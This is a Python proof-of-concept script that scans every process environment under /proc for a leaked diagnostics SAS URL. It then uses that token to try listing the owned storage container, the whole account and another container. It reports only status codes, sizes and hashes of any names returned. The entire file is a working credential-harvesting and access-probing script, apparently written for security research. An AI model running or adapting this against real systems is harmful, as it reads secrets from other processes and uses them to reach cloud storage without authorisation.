#!/usr/bin/env python3
"""Test the leaked diagnostics URL's storage scope without printing secrets."""

import glob
import hashlib
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


proc_root = __import__("os").environ.get("PROC_ROOT", "/proc")
for path in glob.glob(proc_root + "/[0-9]*/environ"):
    try:
        env = dict(item.split(b"=", 1) for item in open(path, "rb").read().split(b"\0") if b"=" in item)
    except OSError:
        continue
    key = next((item for item in (b"diagnostics_sas_uri", b"diagnosticsSasUri")
                if item in env), b"")
    if key:
        break
else:
    raise SystemExit("HCA diagnostics URL not found")

original = env[key].decode()
parts = urllib.parse.urlsplit(original)
segments = [item for item in parts.path.split("/") if item]
container_path = "/" + segments[0] if segments else "/"
query_fields = urllib.parse.parse_qs(parts.query, keep_blank_values=True)
print(
    "HCA_DIAG_META host=%s segments=%d sp=%s sr=%s ss=%s srt=%s" % (
        parts.hostname or "-", len(segments), query_fields.get("sp", ["-"])[0],
        query_fields.get("sr", ["-"])[0], query_fields.get("ss", ["-"])[0],
        query_fields.get("srt", ["-"])[0],
    )
)
paths = [("owned_container", container_path), ("account", "/"),
         ("other_container", "/3900000-nonexistent")]
for label, path in paths:
    query = parts.query + "&restype=container&comp=list"
    url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, query, ""))
    request = urllib.request.Request(url, headers={"User-Agent": "owned-diagnostics-scope-check-3900000"})
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            status, data = response.status, response.read(1 << 20)
    except urllib.error.HTTPError as error:
        status, data = error.code, error.read(1 << 20)
    except OSError as error:
        print(f"HCA_DIAG_SCOPE label={label} network={type(error).__name__}")
        continue
    names = []
    try:
        root = ET.fromstring(data)
        names = [node.text or "" for node in root.iter() if node.tag.rsplit("}", 1)[-1] == "Name"]
    except ET.ParseError:
        pass
    digest = hashlib.sha256("\n".join(names).encode()).hexdigest()[:12]
    print(f"HCA_DIAG_SCOPE label={label} status={status} bytes={len(data)} names={len(names)} names_hash={digest}")
